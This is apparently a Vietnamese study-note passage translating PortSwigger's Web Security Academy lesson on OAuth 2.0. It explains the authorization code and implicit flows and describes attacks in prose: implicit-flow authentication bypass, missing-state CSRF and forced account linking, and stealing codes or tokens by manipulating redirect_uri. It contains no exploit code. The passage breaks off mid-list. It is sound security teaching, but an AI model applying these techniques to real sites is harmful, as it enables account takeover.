# OAuth authentication

Trạng thái: Chưa bắt đầu
subject: Advanced

# Lỗ hổng xác thực OAuth

---

Khi duyệt web, bạn hẳn đã gặp các trang cho phép đăng nhập bằng tài khoản mạng xã hội. Nhiều khả năng tính năng này được xây dựng dựa trên khuôn khổ (framework) OAuth 2.0 phổ biến. OAuth 2.0 đặc biệt thu hút kẻ tấn công vì vừa cực kỳ phổ biến vừa vốn dĩ dễ phát sinh sai sót trong triển khai. Điều này có thể dẫn đến nhiều lỗ hổng, cho phép kẻ tấn công thu thập dữ liệu nhạy cảm của người dùng và thậm chí có thể bỏ qua hoàn toàn bước xác thực.

Trong phần này, chúng tôi sẽ hướng dẫn bạn cách nhận diện và khai thác một số lỗ hổng chủ chốt trong các cơ chế xác thực dựa trên OAuth 2.0. Đừng lo nếu bạn chưa quen với xác thực bằng OAuth - chúng tôi đã cung cấp nhiều thông tin nền giúp bạn hiểu các khái niệm cốt lõi cần thiết. Chúng tôi cũng sẽ khám phá một số lỗ hổng trong phần mở rộng OpenID Connect của OAuth. Cuối cùng, chúng tôi đã bao gồm một số hướng dẫn về cách bảo vệ ứng dụng của chính bạn trước những kiểu tấn công này.

Chủ đề này được biên soạn phối hợp với PortSwigger Research, cùng với bài báo “Hidden OAuth Attack Vectors”.

![image.png](OAuth%20authentication/image.png)

---

# OAuth hoạt động như nào?

---

OAuth 2.0 ban đầu được phát triển như một cách để chia sẻ quyền truy cập vào dữ liệu cụ thể giữa các ứng dụng. Cơ chế này hoạt động bằng cách định nghĩa một chuỗi tương tác giữa ba bên riêng biệt, gồm một ứng dụng khách, một chủ sở hữu tài nguyên và nhà cung cấp dịch vụ OAuth.

**Ứng dụng khách** - Website hoặc ứng dụng web muốn truy cập dữ liệu của người dùng.

**Chủ sở hữu tài nguyên** - Người dùng có dữ liệu mà ứng dụng khách muốn truy cập.

**Nhà cung cấp dịch vụ OAuth** - Website hoặc ứng dụng kiểm soát dữ liệu của người dùng và quyền truy cập vào dữ liệu đó. Họ hỗ trợ OAuth bằng cách cung cấp một API để tương tác với cả máy chủ ủy quyền (authorization server) và máy chủ tài nguyên (resource server).

Có rất nhiều cách khác nhau để quy trình OAuth thực tế được triển khai. Chúng được gọi là “luồng” (flows) hoặc “kiểu cấp quyền” (grant types) của OAuth. Trong chủ đề này, chúng tôi sẽ tập trung vào các kiểu cấp quyền “authorization code” và “implicit” vì đây là những kiểu phổ biến nhất. Nói chung, cả hai kiểu này đều bao gồm các giai đoạn sau:

- Ứng dụng khách yêu cầu quyền truy cập vào một tập con dữ liệu của người dùng, chỉ ra kiểu cấp quyền muốn sử dụng và loại quyền truy cập mong muốn.
- Người dùng được nhắc đăng nhập vào dịch vụ OAuth và rõ ràng đồng ý cho quyền truy cập được yêu cầu.
- Ứng dụng khách nhận một mã thông báo truy cập (access token) duy nhất chứng minh họ có sự cho phép từ người dùng để truy cập dữ liệu đã yêu cầu. Cách thức chính xác để có được điều này thay đổi đáng kể tùy theo kiểu cấp quyền.
- Ứng dụng khách sử dụng mã thông báo truy cập này để gọi API và lấy dữ liệu liên quan từ máy chủ tài nguyên.

Trước khi tìm hiểu cách OAuth được sử dụng cho mục đích xác thực, điều quan trọng là phải nắm được các nguyên lý của quy trình OAuth cơ bản này. Nếu bạn hoàn toàn mới với OAuth, chúng tôi khuyến nghị bạn làm quen với chi tiết của cả hai kiểu cấp quyền mà chúng tôi sẽ đề cập trước khi đọc tiếp.

---

# Các kiểu cấp quyền

---

Trong phần này, chúng tôi sẽ trình bày những kiến thức cơ bản về hai kiểu cấp quyền OAuth phổ biến nhất. Nếu bạn hoàn toàn mới với OAuth, chúng tôi khuyến nghị đọc phần này trước khi thử hoàn thành các lab xác thực OAuth của chúng tôi.

---

## Khái niệm

---

Kiểu cấp quyền OAuth xác định chuỗi bước cụ thể có trong quy trình OAuth. Kiểu cấp quyền cũng ảnh hưởng đến cách ứng dụng khách giao tiếp với dịch vụ OAuth ở từng giai đoạn, bao gồm cả cách chính mã thông báo truy cập được gửi đi. Vì lý do này, các kiểu cấp quyền thường được gọi là “luồng OAuth” (OAuth flows).

Một dịch vụ OAuth phải được cấu hình để hỗ trợ một kiểu cấp quyền cụ thể trước khi ứng dụng khách có thể khởi tạo luồng tương ứng. Ứng dụng khách chỉ định kiểu cấp quyền muốn sử dụng trong yêu cầu ủy quyền ban đầu mà nó gửi tới dịch vụ OAuth.

Có một số kiểu cấp quyền khác nhau, mỗi kiểu có mức độ phức tạp và các cân nhắc bảo mật khác nhau. Chúng tôi sẽ tập trung vào hai kiểu “authorization code” và “implicit” vì đây là những kiểu phổ biến nhất.

---

## Phạm vi

---

Với bất kỳ kiểu cấp quyền (grant type) nào của OAuth, ứng dụng khách phải chỉ ra dữ liệu mà nó muốn truy cập và loại thao tác mà nó muốn thực hiện. Việc này được thực hiện thông qua tham số `scope` trong yêu cầu ủy quyền mà ứng dụng khách gửi tới dịch vụ OAuth.

Đối với OAuth cơ bản, các phạm vi mà ứng dụng khách có thể yêu cầu truy cập là duy nhất cho từng dịch vụ OAuth. Vì tên phạm vi chỉ là một chuỗi văn bản tùy ý, định dạng có thể thay đổi rất nhiều giữa các nhà cung cấp. Một số thậm chí dùng toàn bộ URI làm tên phạm vi, tương tự như một endpoint của REST API. Ví dụ, khi yêu cầu quyền đọc danh sách liên hệ của người dùng, tên phạm vi có thể có bất kỳ dạng nào sau đây tùy theo dịch vụ OAuth đang dùng:

```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

Tuy nhiên, khi OAuth được dùng cho mục đích **xác thực**, các phạm vi **OpenID Connect** chuẩn hóa thường được sử dụng thay thế. Ví dụ, `scope=openid profile` sẽ cấp cho ứng dụng khách quyền đọc một tập thông tin cơ bản được định nghĩa sẵn về người dùng, như địa chỉ email, tên người dùng, v.v. Chúng ta sẽ bàn thêm về OpenID Connect sau.

---

## Authorization Code

---

Kiểu cấp quyền authorization code ban đầu trông khá phức tạp, nhưng thực ra đơn giản hơn bạn nghĩ khi đã nắm vài kiến thức cơ bản.

Tóm lại, ứng dụng khách và dịch vụ OAuth trước tiên sử dụng các lần chuyển hướng để trao đổi một loạt yêu cầu HTTP dựa trên trình duyệt nhằm khởi tạo luồng. Người dùng được hỏi liệu họ có đồng ý với quyền truy cập được yêu cầu hay không. Nếu chấp nhận, ứng dụng khách sẽ được cấp một “authorization code”. Ứng dụng khách sau đó trao đổi mã này với dịch vụ OAuth để nhận “access token”, thứ mà họ có thể dùng để gọi API và lấy dữ liệu người dùng liên quan.

Toàn bộ liên lạc diễn ra kể từ bước trao đổi code/token trở đi được gửi theo kiểu server-to-server qua một kênh ngầm an toàn, cấu hình sẵn, do đó người dùng cuối sẽ không nhìn thấy. Kênh an toàn này được thiết lập khi ứng dụng khách lần đầu đăng ký với dịch vụ OAuth. Tại thời điểm này, một `client_secret` cũng được tạo ra, và ứng dụng khách phải dùng nó để xác thực chính mình khi gửi các yêu cầu server-to-server này.

Vì dữ liệu nhạy cảm nhất (access token và dữ liệu người dùng) không được gửi qua trình duyệt, kiểu cấp quyền này có thể coi là an toàn nhất. Ứng dụng phía máy chủ (server-side) lý tưởng nên luôn sử dụng kiểu cấp quyền này nếu có thể.

![image.png](OAuth%20authentication/image%201.png)

---

### 1. Authorization request

---

Ứng dụng khách gửi một yêu cầu tới endpoint `/authorization` của dịch vụ OAuth để xin quyền truy cập dữ liệu người dùng cụ thể. Lưu ý rằng ánh xạ endpoint có thể khác nhau giữa các nhà cung cấp - trong các lab của chúng tôi, endpoint dùng cho mục đích này là `/auth`. Tuy nhiên, bạn luôn có thể nhận diện endpoint dựa trên các tham số được dùng trong yêu cầu.

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

Yêu cầu này chứa các tham số đáng chú ý sau, thường được cung cấp trong query string:

**client_id**

Tham số bắt buộc chứa định danh duy nhất của ứng dụng khách. Giá trị này được tạo ra khi ứng dụng khách đăng ký với dịch vụ OAuth.

**redirect_uri**

URI mà trình duyệt của người dùng sẽ được chuyển hướng tới khi gửi authorization code về cho ứng dụng khách. Tham số này còn được gọi là “callback URI” hoặc “callback endpoint”. Nhiều cuộc tấn công OAuth dựa trên việc khai thác lỗ hổng trong khâu kiểm tra hợp lệ tham số này.

**response_type**

Xác định loại phản hồi mà ứng dụng khách mong đợi và do đó cũng xác định luồng (flow) mà nó muốn khởi tạo. Với kiểu cấp quyền authorization code, giá trị phải là `code`.

**scope**

Dùng để chỉ định tập con dữ liệu của người dùng mà ứng dụng khách muốn truy cập. Lưu ý rằng đây có thể là các scope tùy biến do nhà cung cấp OAuth định nghĩa hoặc các scope chuẩn hóa do đặc tả OpenID Connect định nghĩa. Chúng ta sẽ bàn chi tiết hơn về OpenID Connect sau.

**state**

Lưu trữ một giá trị duy nhất, không thể đoán được, gắn với phiên hiện tại trên ứng dụng khách. Dịch vụ OAuth phải trả về đúng giá trị này trong phản hồi, cùng với authorization code. Tham số này đóng vai trò như một mã CSRF cho ứng dụng khách bằng cách đảm bảo rằng yêu cầu tới endpoint `/callback` của nó đến từ đúng người đã khởi tạo luồng OAuth.

---

### **2. User login and consent**

---

Khi máy chủ ủy quyền (authorization server) nhận được yêu cầu ban đầu, nó sẽ chuyển hướng người dùng đến một trang đăng nhập, nơi họ được nhắc đăng nhập vào tài khoản của mình với nhà cung cấp OAuth. Ví dụ, tài khoản này thường là tài khoản mạng xã hội của họ.

Sau đó, người dùng sẽ được hiển thị một danh sách dữ liệu mà ứng dụng khách muốn truy cập. Danh sách này dựa trên các **scope** đã được xác định trong yêu cầu ủy quyền. Người dùng có thể chọn đồng ý hoặc từ chối quyền truy cập này.

Điều quan trọng cần lưu ý là: khi người dùng đã chấp thuận một scope nhất định cho ứng dụng khách, bước này sẽ được tự động hoàn tất miễn là người dùng vẫn có một phiên đăng nhập hợp lệ với dịch vụ OAuth. Nói cách khác, lần đầu tiên người dùng chọn **“Đăng nhập bằng mạng xã hội”**, họ sẽ phải đăng nhập thủ công và đưa ra sự chấp thuận. Nhưng nếu sau đó họ quay lại ứng dụng khách, họ thường có thể đăng nhập lại chỉ với **một cú nhấp chuột**.

---

### **3. Authorization code grant**

---

Nếu người dùng chấp thuận quyền truy cập được yêu cầu, trình duyệt của họ sẽ được chuyển hướng đến endpoint `/callback` đã được chỉ định trong tham số `redirect_uri` của yêu cầu ủy quyền. Yêu cầu GET tạo ra sẽ chứa **authorization code** dưới dạng tham số truy vấn. Tùy cấu hình, nó cũng có thể gửi kèm tham số `state` với cùng giá trị như trong yêu cầu ủy quyền.

```
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

---

### **4. Access token request**

---

Khi ứng dụng khách nhận được authorization code, nó cần trao đổi mã này để lấy **access token**. Để làm điều này, ứng dụng gửi một yêu cầu **POST** server-to-server tới endpoint `/token` của dịch vụ OAuth. Từ thời điểm này, toàn bộ liên lạc diễn ra qua một kênh ngầm an toàn (secure back-channel), do đó kẻ tấn công thường không thể quan sát hay kiểm soát được.

```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

Ngoài `client_id` và authorization code, bạn sẽ thấy các tham số mới sau:

**client_secret**

Ứng dụng khách phải tự xác thực bằng cách đưa vào khóa bí mật được cấp khi đăng ký với dịch vụ OAuth.

**grant_type**

Dùng để đảm bảo endpoint mới biết kiểu cấp quyền mà ứng dụng khách muốn sử dụng. Trong trường hợp này, giá trị phải là `authorization_code`.

---

### **5. Access token grant**

---

Dịch vụ OAuth sẽ kiểm tra (validate) yêu cầu lấy access token. Nếu mọi thứ đúng như mong đợi, máy chủ sẽ phản hồi bằng cách cấp cho ứng dụng khách một **access token** với phạm vi (scope) đã yêu cầu.

```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile",
    …
}
```

---

### 6. API call

---

Khi ứng dụng khách đã có **access token**, nó có thể lấy dữ liệu người dùng từ **resource server**. Để làm điều này, ứng dụng gọi API tới endpoint `/userinfo` của dịch vụ OAuth. **Access token** được gửi trong header `Authorization: Bearer` để chứng minh ứng dụng khách có quyền truy cập dữ liệu này.

```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

---

### **7. Resource grant**

---

Máy chủ tài nguyên (**resource server**) sẽ kiểm tra xem token có hợp lệ và có thuộc về ứng dụng khách hiện tại hay không. Nếu hợp lệ, nó sẽ phản hồi bằng cách gửi về **tài nguyên được yêu cầu**, tức dữ liệu người dùng dựa trên **scope** của access token.

```json
{
    "username": "carlos",
    "email": "carlos@carlos-montoya.net",
    …
}
```

Ứng dụng khách cuối cùng có thể sử dụng dữ liệu này cho mục đích ban đầu. Trong trường hợp OAuth được dùng cho **xác thực**, dữ liệu này thường sẽ được dùng như một **định danh (ID)** để cấp cho người dùng một phiên đăng nhập đã xác thực, tức là **đăng nhập thành công**.

---

## **Implicit**

---

Kiểu cấp quyền **implicit** đơn giản hơn nhiều. Thay vì trước hết nhận **authorization code** rồi trao đổi để lấy **access token**, ứng dụng khách nhận **access token** ngay sau khi người dùng chấp thuận.

Bạn có thể thắc mắc tại sao ứng dụng khách không luôn dùng kiểu implicit. Câu trả lời khá đơn giản — nó kém an toàn hơn nhiều. Khi dùng implicit, toàn bộ trao đổi diễn ra qua các lần chuyển hướng của trình duyệt — không có kênh ngầm an toàn (secure back-channel) như trong luồng authorization code. Điều này đồng nghĩa **access token** nhạy cảm và dữ liệu người dùng dễ bị lộ trước các cuộc tấn công hơn.

Kiểu implicit phù hợp hơn với **single-page application (SPA)** và **ứng dụng desktop native**, vốn khó lưu trữ `client_secret` ở back-end, do đó không tận dụng được nhiều lợi ích của kiểu **authorization code**.

![image.png](OAuth%20authentication/image%202.png)

---

### 1. Authorization request

---

Luồng implicit bắt đầu gần như giống hệt luồng authorization code. Khác biệt chính là tham số `response_type` phải được đặt thành `token`.

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

---

### 2. User login and consent

---

Người dùng đăng nhập và quyết định có chấp thuận các quyền được yêu cầu hay không. Quy trình này hoàn toàn giống như trong luồng authorization code.

---

### 3. Access token grant

---

Nếu người dùng chấp thuận quyền truy cập được yêu cầu, từ đây mới bắt đầu khác. Dịch vụ OAuth sẽ chuyển hướng trình duyệt của người dùng đến `redirect_uri` được chỉ định trong yêu cầu ủy quyền. Tuy nhiên, thay vì gửi tham số truy vấn chứa authorization code, nó sẽ gửi **access token** và các dữ liệu liên quan đến token dưới dạng **URL fragment**.

```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

Vì access token được gửi trong URL fragment, nó không bao giờ được gửi trực tiếp tới ứng dụng khách. Thay vào đó, ứng dụng khách phải dùng một script phù hợp để trích xuất fragment và lưu trữ nó.

---

### 4. API call

---

Khi ứng dụng khách đã trích xuất thành công access token từ URL fragment, nó có thể dùng token này để gọi API tới endpoint `/userinfo` của dịch vụ OAuth. Khác với luồng authorization code, bước này cũng diễn ra qua trình duyệt.

```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

---

### 5. Resource grant

---

Máy chủ tài nguyên cần xác minh token hợp lệ và thuộc về ứng dụng khách hiện tại. Nếu đúng, nó sẽ phản hồi bằng cách gửi tài nguyên được yêu cầu, tức dữ liệu người dùng dựa trên scope gắn với access token.

```json
{
    "username":"carlos",
    "email":"carlos@carlos-montoya.net"
}
```

Ứng dụng khách cuối cùng có thể sử dụng dữ liệu này cho mục đích ban đầu. Trong trường hợp OAuth dùng cho xác thực, dữ liệu này thường được dùng làm ID để cấp cho người dùng một phiên đã xác thực, tức là đăng nhập thành công.

---

# OAuth

---

Mặc dù ban đầu không được thiết kế cho mục đích này, OAuth đã tiến hóa thành một phương thức để **xác thực người dùng**. Ví dụ, có lẽ bạn quen với tuỳ chọn nhiều trang web cung cấp — đăng nhập bằng tài khoản mạng xã hội hiện có thay vì phải đăng ký trực tiếp trên trang đó. Mỗi khi bạn thấy tuỳ chọn này, rất có khả năng nó được xây dựng trên OAuth 2.0.

Đối với các cơ chế **xác thực bằng OAuth**, các luồng OAuth cơ bản vẫn phần lớn giống nhau; khác biệt chính nằm ở cách ứng dụng khách sử dụng dữ liệu mà nó nhận được. Từ góc nhìn người dùng cuối, kết quả của xác thực bằng OAuth trông tương tự như đăng nhập một lần (SSO) dựa trên SAML. Trong tài liệu này, chúng tôi sẽ chỉ tập trung vào các lỗ hổng trong trường hợp sử dụng giống SSO như vậy.

Việc triển khai xác thực bằng OAuth thường diễn ra như sau:

- Người dùng chọn tuỳ chọn đăng nhập bằng tài khoản mạng xã hội. Ứng dụng khách sẽ sử dụng dịch vụ OAuth của mạng xã hội đó để yêu cầu quyền truy cập một số dữ liệu mà ứng dụng có thể dùng để nhận diện người dùng. Ví dụ, đây có thể là địa chỉ email đã đăng ký với tài khoản của họ.
- Sau khi nhận được access token, ứng dụng khách sẽ yêu cầu dữ liệu này từ resource server, thường là từ một endpoint chuyên biệt như `/userinfo`.
- Khi nhận được dữ liệu, ứng dụng khách dùng dữ liệu đó thay cho tên người dùng để đăng nhập cho người dùng. Access token mà ứng dụng nhận từ authorization server thường được dùng thay cho mật khẩu truyền thống.

Bạn có thể xem một ví dụ đơn giản trong lab sau. Chỉ cần chọn tuỳ chọn **“Log in with social media”** trong khi proxy lưu lượng qua Burp, rồi nghiên cứu chuỗi tương tác OAuth trong lịch sử proxy. Bạn có thể đăng nhập bằng thông tin xác thực `wiener:peter`. Lưu ý rằng cài đặt này được làm dễ tổn thương có chủ ý — chúng tôi sẽ hướng dẫn bạn cách khai thác điều này sau.

---

## Nhận diện OAuth

---

Việc nhận biết một ứng dụng đang dùng OAuth để xác thực nhìn chung khá đơn giản. Nếu bạn thấy tùy chọn đăng nhập bằng tài khoản từ một website khác, đây là dấu hiệu mạnh mẽ cho thấy OAuth đang được sử dụng.

Cách đáng tin cậy nhất để nhận diện OAuth là proxy lưu lượng qua Burp và kiểm tra các thông điệp HTTP tương ứng khi bạn dùng tùy chọn đăng nhập này. Bất kể ứng dụng dùng loại grant nào của OAuth, yêu cầu đầu tiên trong luồng luôn là yêu cầu tới endpoint **`/authorization`** chứa một số tham số truy vấn dành riêng cho OAuth. Đặc biệt, hãy chú ý các tham số **`client_id`**, **`redirect_uri`**, và **`response_type`**. Ví dụ, một yêu cầu ủy quyền (authorization request) thường sẽ trông như sau:

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

---

## Trinh sát

---

Thực hiện một số bước trinh sát cơ bản đối với dịch vụ OAuth đang được sử dụng có thể giúp bạn đi đúng hướng trong việc xác định lỗ hổng.

Không cần phải nói, bạn nên nghiên cứu các tương tác HTTP tạo thành luồng OAuth — chúng ta sẽ đề cập đến một số điểm cụ thể cần chú ý ở phần sau. Nếu sử dụng dịch vụ OAuth bên ngoài, bạn thường có thể nhận diện nhà cung cấp cụ thể từ hostname mà yêu cầu ủy quyền được gửi tới. Vì các dịch vụ này cung cấp API công khai, thường có tài liệu chi tiết cho biết nhiều thông tin hữu ích, chẳng hạn tên chính xác của các endpoint và những tùy chọn cấu hình đang được dùng.

Khi đã biết hostname của máy chủ ủy quyền, bạn luôn nên thử gửi yêu cầu GET tới các endpoint chuẩn sau:

```graphql
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

Các endpoint này thường trả về tệp cấu hình JSON chứa thông tin then chốt, chẳng hạn chi tiết về các tính năng bổ sung có thể được hỗ trợ. Đôi khi điều này sẽ gợi ý cho bạn về bề mặt tấn công rộng hơn và các tính năng được hỗ trợ nhưng không được đề cập trong tài liệu.

---

# Phát sinh lỗ hổng OAuth

---

Các lỗ hổng xác thực OAuth phát sinh một phần vì đặc tả OAuth vốn tương đối mơ hồ và linh hoạt theo thiết kế. Mặc dù có một số thành phần bắt buộc cần thiết cho chức năng cơ bản của mỗi kiểu cấp quyền (grant type), phần lớn việc triển khai còn lại là hoàn toàn tùy chọn. Điều này bao gồm nhiều thiết lập cấu hình vốn cần thiết để giữ an toàn cho dữ liệu người dùng. Nói ngắn gọn, có rất nhiều kẽ hở để các thực hành không an toàn len lỏi vào.

Một vấn đề trọng yếu khác với OAuth là nhìn chung thiếu các tính năng bảo mật tích hợp sẵn. Tính bảo mật gần như phụ thuộc hoàn toàn vào việc nhà phát triển sử dụng đúng tổ hợp các tùy chọn cấu hình và triển khai thêm các biện pháp bảo vệ bổ sung ở phía trên, chẳng hạn như kiểm tra tính hợp lệ đầu vào (robust input validation). Như bạn có thể thấy, có rất nhiều thứ cần nắm và điều này khá dễ làm sai nếu bạn thiếu kinh nghiệm với OAuth.

Tùy thuộc vào kiểu cấp quyền, dữ liệu có độ nhạy cảm cao cũng có thể được gửi qua trình duyệt, tạo ra nhiều cơ hội để kẻ tấn công đánh chặn.

---

# Khai thác lỗ hổng OAuth

---

Các lỗ hổng có thể phát sinh trong phần triển khai OAuth của ứng dụng khách cũng như trong cấu hình của chính dịch vụ OAuth. Trong phần này, chúng tôi sẽ chỉ cho bạn cách khai thác một số lỗ hổng phổ biến nhất trong cả hai bối cảnh này.

**Các lỗ hổng trong ứng dụng khách**

- Triển khai sai kiểu cấp quyền implicit (implicit grant)
- Cơ chế bảo vệ CSRF khiếm khuyết

**Các lỗ hổng trong dịch vụ OAuth**

- Rò rỉ authorization code và access token
- Xác thực (thẩm định) scope không chặt chẽ
- Đăng ký người dùng không được xác minh

---

## Lỗ hổng ứng dụng khách

---

Các ứng dụng khách thường sử dụng một dịch vụ OAuth uy tín, dày dạn trận mạc, được bảo vệ tốt trước các kỹ thuật khai thác đã được biết đến rộng rãi. Tuy nhiên, phần triển khai ở phía họ có thể kém an toàn hơn.

Như chúng tôi đã đề cập, đặc tả OAuth được định nghĩa tương đối lỏng lẻo. Điều này đặc biệt đúng đối với phần triển khai bởi ứng dụng khách. Có rất nhiều thành phần trong một luồng OAuth, với nhiều tham số tùy chọn và thiết lập cấu hình trong mỗi kiểu cấp quyền (grant type), đồng nghĩa với việc có rất nhiều dư địa cho các cấu hình sai.

---

### Triển khai sai kiểu cấp quyền implicit

---

Do những rủi ro phát sinh khi truyền access token qua trình duyệt, kiểu cấp quyền implicit chủ yếu được khuyến nghị cho các ứng dụng đơn trang (SPA). Tuy nhiên, nó cũng thường được dùng trong các ứng dụng web client–server kiểu cổ điển vì tính đơn giản tương đối.

Trong luồng này, access token được gửi từ dịch vụ OAuth đến ứng dụng khách thông qua trình duyệt của người dùng dưới dạng một fragment của URL (phần băm #). Ứng dụng khách sau đó truy cập token bằng JavaScript. Vấn đề là, nếu ứng dụng muốn duy trì phiên sau khi người dùng đóng trang, nó cần lưu trữ dữ liệu người dùng hiện tại (thường là một ID người dùng và access token) ở đâu đó.

Để giải quyết vấn đề này, ứng dụng khách thường sẽ gửi các dữ liệu này lên máy chủ bằng một yêu cầu POST, rồi gán cho người dùng một cookie phiên, thực chất là đăng nhập họ vào. Yêu cầu này tương đương một cách gần đúng với yêu cầu gửi biểu mẫu có thể được gửi như một phần của quy trình đăng nhập dựa trên mật khẩu cổ điển. Tuy nhiên, trong kịch bản này, máy chủ không có bất kỳ bí mật hoặc mật khẩu nào để so sánh với dữ liệu được gửi, đồng nghĩa với việc dữ liệu đó được mặc nhiên tin cậy.

Trong luồng implicit, yêu cầu POST này bị lộ cho kẻ tấn công thông qua trình duyệt của họ. Do đó, hành vi này có thể dẫn đến một lỗ hổng nghiêm trọng nếu ứng dụng khách không kiểm tra đúng đắn rằng access token khớp với các dữ liệu khác trong yêu cầu. Trong trường hợp này, kẻ tấn công chỉ cần thay đổi các tham số gửi lên máy chủ để mạo danh bất kỳ người dùng nào.

[Lab: Authentication bypass via OAuth implicit flow | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

---

### Thiếu bảo vệ CSRF

---

Mặc dù nhiều thành phần trong các luồng OAuth là tùy chọn, một số thành phần được khuyến nghị mạnh mẽ trừ khi có lý do quan trọng để không dùng. Một ví dụ như vậy là tham số `state`.

Về lý tưởng, tham số `state` nên chứa một giá trị không thể đoán được, chẳng hạn như giá trị băm của thứ gì đó gắn với phiên của người dùng khi họ khởi tạo luồng OAuth lần đầu. Giá trị này sau đó được chuyển qua lại giữa ứng dụng khách và dịch vụ OAuth như một dạng `token CSRF` cho ứng dụng khách. Do đó, nếu bạn nhận thấy rằng yêu cầu ủy quyền không gửi tham số `state`, điều này cực kỳ đáng chú ý từ góc nhìn của kẻ tấn công. Nó có thể đồng nghĩa với việc kẻ tấn công tự khởi tạo một luồng OAuth trước, rồi lừa trình duyệt của người dùng hoàn tất luồng đó, tương tự một cuộc tấn công CSRF truyền thống. Điều này có thể gây hậu quả nghiêm trọng tùy thuộc vào cách ứng dụng khách đang sử dụng OAuth.

Hãy xét một website cho phép người dùng đăng nhập bằng cơ chế cổ điển dựa trên mật khẩu hoặc bằng cách liên kết tài khoản của họ với hồ sơ mạng xã hội thông qua OAuth. Trong trường hợp này, nếu ứng dụng không sử dụng tham số `state`, kẻ tấn công có thể chiếm quyền tài khoản của người dùng nạn nhân trên ứng dụng khách bằng cách liên kết nó với tài khoản mạng xã hội của chính chúng.

[Lab: Forced OAuth profile linking | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

> **Lưu ý**
nếu trang web chỉ cho phép người dùng đăng nhập thông qua OAuth, thì tham số `state` có thể kém quan trọng hơn. Tuy nhiên, việc không sử dụng tham số `state` vẫn có thể cho phép kẻ tấn công dựng nên các cuộc tấn công **`login CSRF`**, trong đó người dùng bị lừa đăng nhập vào tài khoản của kẻ tấn công.
> 

---

## Lỗ hổng dịch vụ OAuth

---

### Rò rỉ authorization code và access token

---

Có lẽ lỗ hổng dựa trên OAuth nổi tiếng nhất là khi cấu hình của chính dịch vụ OAuth cho phép kẻ tấn công đánh cắp các **authorization code** hoặc **access token** liên quan tới tài khoản của người dùng khác. Bằng cách đánh cắp một mã hoặc token hợp lệ, kẻ tấn công có thể truy cập dữ liệu của nạn nhân. Cuối cùng, điều này có thể hoàn toàn thỏa hiệp tài khoản của họ — kẻ tấn công có khả năng đăng nhập thay cho nạn nhân trên bất kỳ ứng dụng khách nào đã đăng ký với dịch vụ OAuth đó.

Tùy theo kiểu cấp quyền (grant type), một mã hoặc token sẽ được gửi qua trình duyệt của nạn nhân tới endpoint `/callback` được chỉ định trong tham số `redirect_uri` của yêu cầu ủy quyền. Nếu dịch vụ OAuth không kiểm tra tham số URI này đúng cách, kẻ tấn công có thể dựng được một cuộc tấn công kiểu CSRF, lừa trình duyệt của nạn nhân khởi tạo một luồng OAuth khiến mã hoặc token được gửi tới một `redirect_uri` do kẻ tấn công kiểm soát.

Trong trường hợp luồng authorization code, kẻ tấn công có thể đánh cắp mã của nạn nhân trước khi mã đó được sử dụng. Sau đó họ có thể gửi mã này tới endpoint `/callback` hợp lệ của ứng dụng khách (giá trị `redirect_uri` gốc) để lấy quyền truy cập vào tài khoản người dùng. Trong kịch bản này, kẻ tấn công thậm chí không cần biết `client_secret` hay mã truy cập kết quả. Miễn là nạn nhân còn một phiên hợp lệ với dịch vụ OAuth, ứng dụng khách sẽ hoàn tất việc trao đổi code/token thay cho kẻ tấn công và đăng nhập họ vào tài khoản của nạn nhân.

> Lưu ý rằng việc sử dụng bảo vệ `state` hoặc `nonce` không nhất thiết ngăn được các cuộc tấn công này vì kẻ tấn công có thể tạo giá trị mới từ chính trình duyệt của họ.
> 

Các authorization server an toàn hơn sẽ yêu cầu tham số `redirect_uri` được gửi kèm khi trao đổi mã. Máy chủ sau đó có thể kiểm tra xem giá trị này có khớp với `redirect_uri` đã nhận trong yêu cầu ủy quyền ban đầu hay không và từ chối việc trao đổi nếu không khớp. Vì bước này diễn ra trong các yêu cầu server-to-server qua một kênh ngầm an toàn, kẻ tấn công không thể kiểm soát tham số `redirect_uri` thứ hai này.

[Lab: OAuth account hijacking via redirect_uri | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

---

### Kiểm tra không chặt chẽ `redirect_uri`

---

Do những kiểu tấn công đã thấy trong lab trước, thực hành tốt nhất là ứng dụng client nên cung cấp **danh sách trắng** các URI callback hợp lệ khi đăng ký với dịch vụ OAuth. Khi đó, khi dịch vụ OAuth nhận được một yêu cầu mới, nó có thể xác thực tham số **`redirect_uri`** đối chiếu với danh sách trắng này — trong trường hợp đó, gửi một URI ngoại vi thường sẽ gây ra lỗi. Tuy nhiên, vẫn có thể tồn tại những cách vượt rào kiểm tra này.

Khi kiểm toán một luồng OAuth, bạn nên thử nghiệm với tham số `redirect_uri` để hiểu cách nó đang được xác thực. Ví dụ:

- Một số triển khai cho phép một loạt các thư mục con bằng cách chỉ kiểm tra chuỗi bắt đầu với một dãy ký tự đúng, tức là chỉ xác thực domain đã được phê duyệt. Bạn nên thử xóa hoặc thêm các đường dẫn tùy ý, các tham số truy vấn, và fragment để xem bạn có thể thay đổi gì mà không gây lỗi.
